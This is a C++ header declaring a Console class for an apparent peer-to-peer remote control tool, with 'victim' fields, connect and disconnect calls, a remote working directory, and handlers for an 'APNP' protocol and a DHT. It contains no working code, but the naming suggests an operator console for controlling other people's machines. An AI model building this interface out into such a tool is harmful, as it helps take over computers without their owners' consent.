#ifndef CONSOLE_H
#define CONSOLE_H

#include <memory>

#include "node.h"

using namespace std;

class Node;

enum Color { Black, Blue, Green, Cyan, Red, Magenta, Brown, LightGray, DarkGray, LightBlue, LightGreen, LightCyan, LightRed, LightMagenta, Yellow, White };

class Console {
public:
	shared_ptr<Node> node;
	string cwd;
	bool connected = false;
	int victim;
	string victim_name;
	bool exit = false;

	Console(shared_ptr<Node> n);
	~Console();
	void chdir(string dir);
	void handleAPNP(string data);
	void connect(string name);
	void connect(int id);
	void disconnect();
	void setColor(Color text_color = LightGray, Color background_color = Black);
	void printColored(string text, Color text_color, Color background_color = Black);
	void printWelcome();
	void printHelp();
	void printDHT();
	void handleInput(string data);
};

/*

apnp
v	cwd
v		D:\
v	output
v		...

*/

#endif CONSOLE_H